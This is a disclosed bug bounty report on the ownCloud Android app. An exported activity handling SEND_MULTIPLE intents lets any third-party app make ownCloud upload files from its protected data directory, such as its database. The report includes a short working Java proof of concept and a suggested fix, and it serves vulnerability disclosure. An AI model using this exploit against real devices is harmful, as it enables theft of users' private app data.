# Theft of protected files on Android

## Report Details
- **Report ID**: 1454002
- **URL**: https://hackerone.com/reports/1454002
- **State**: Closed
- **Severity**: low
- **Submitted**: 2022-01-19T12:49:29.034Z
- **Disclosed**: 2022-03-17T08:42:53.345Z

## Reporter
- **Username**: n00b-cyborg
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: owncloud

## Vulnerability Information
There is an issue that allows to retrieve any files from protected directory of application - ```/data/data/com.owncloud.android/*```.
The issue is caused by exported activity ```com.owncloud.android.ui.activity.ReceiveExternalFilesActivity``` with intent filter ```android.intent.action.SEND_MULTIPLE``` that accepts URI of files for upload. Any 3rd-party application could start this activity and upload on server any files such as database file from protected directory in context of owncloud application.

Tested on latest stable version of app - 2.19.
Version of android - 11.

Java PoC:
```Java
StrictMode.VmPolicy.Builder builder = new StrictMode.VmPolicy.Builder();
StrictMode.setVmPolicy(builder.build());
Intent intent = new Intent("android.intent.action.SEND_MULTIPLE");
intent.setClassName("com.owncloud.android", "com.owncloud.android.ui.activity.ReceiveExternalFilesActivity");
intent.setType("*/*");
intent.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
ArrayList mStreamsToUpload = new ArrayList<>();
mStreamsToUpload.add(Uri.parse("file:///data/data/com.owncloud.android/databases/filelist"));
intent.putExtra("android.intent.extra.STREAM", mStreamsToUpload);
startActivity(intent);
```

**Mitigation:**
There is valid protection for preventing reading files from directory ```/data/data/com.owncloud.android/*``` in similar intent-filter ```android.intent.action.SEND```. Copy this protection for ```android.intent.action.SEND_MULTIPLE```.

## Impact

Potential attacker could steal files from protected directory of application for example files of databases, cache and history of files.

## Attachments
- before_exploit.jpg
- after_exploit.jpg
- database_theft.png
- owncl.apk
